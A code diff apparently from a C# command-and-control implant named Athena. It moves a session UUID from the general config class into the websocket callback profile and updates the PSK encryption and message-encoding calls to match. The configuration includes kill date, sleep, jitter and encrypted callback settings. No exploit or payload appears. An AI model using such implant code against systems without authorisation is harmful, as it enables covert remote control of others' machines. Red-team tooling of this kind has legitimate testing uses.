@@ -14,14 +14,12 @@ namespace Athena
     public class Config : IConfig
     {
         public IProfile profile { get; set; }
-        public static string uuid { get; set; }
         public DateTime killDate { get; set; }
         public int sleep { get; set; }
         public int jitter { get; set; }
 
         public Config()
         {
-            uuid = "%UUID%";
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
             int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
@@ -34,6 +32,7 @@ namespace Athena
 
     public class Websocket : IProfile
     {
+        public string uuid { get; set; }
         public string psk { get; set; }
         public string endpoint { get; set; }
         public string userAgent { get; set; }
@@ -54,9 +53,10 @@ namespace Athena
             this.hostHeader = "%HOSTHEADER%";
             this.psk = "AESPSK";
             this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
+            this.uuid = "%UUID%";
             if (!string.IsNullOrEmpty(this.psk))
             {
-                this.crypt = new PSKCrypto(Config.uuid, this.psk);
+                this.crypt = new PSKCrypto(this.uuid, this.psk);
                 this.encrypted = true;
             }
 
@@ -106,7 +106,7 @@ namespace Athena
                 }
                 else
                 {
-                    json = await Misc.Base64Encode(Config.uuid + json);
+                    json = await Misc.Base64Encode(this.uuid + json);
                 }
 
                 WebSocketMessage m = new WebSocketMessage()
